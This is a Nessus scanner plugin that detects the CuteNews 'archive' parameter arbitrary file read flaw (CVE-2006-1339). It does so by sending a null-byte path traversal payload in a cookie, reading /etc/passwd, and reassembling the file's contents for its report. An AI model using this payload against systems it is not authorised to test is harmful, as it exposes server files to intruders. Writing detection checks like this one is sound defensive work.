#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21119);
  script_version ("$Revision: 1.19 $");

  script_cve_id("CVE-2006-1339");
  script_bugtraq_id(17152);
  script_osvdb_id(24008);

  script_name(english:"CuteNews inc/function.php archive Parameter Arbitrary File Access");

  script_summary(english:"Tries to read a file via archive parameter of CuteNews");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows reading of
arbitrary files." );
 script_set_attribute(attribute:"description", value:
"The version of CuteNews installed on the remote host fails to properly
sanitize the 'archive' parameter before using it to read a news file
and return it.  An unauthenticated, remote attacker may be able to
leverage this issue to read arbitrary files on the remote host subject
to permissions of the web server user id. In addition, malformed 
input may cause the application to reveal the installation path.

Note that successful exploitation of this issue requires that PHP's
'register_globals' setting be enabled." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2006/Mar/405" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/20");
 script_cvs_date("$Date: 2016/10/10 15:57:04 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("cutenews_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/cutenews");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/cutenews"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  init_cookiejar();
  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../../etc/passwd%00";
  set_http_cookie(name: 'archive', value: file);
  r = http_send_recv3(method: 'GET', item:string(dir, "/example2.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    # Piece the file back together.
    contents = "";
    while (res = strstr(res, "example2.php?subaction=showcomments&amp;id="))
    {
      entry = strstr(res, "id=");
      if (entry) entry = entry - "id=";
      if (entry) entry = entry - strstr(entry, "&amp;");
      if (entry) 
      {
        contents += entry;
        res = strstr(res, entry);
      }
      else break;
    }

    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
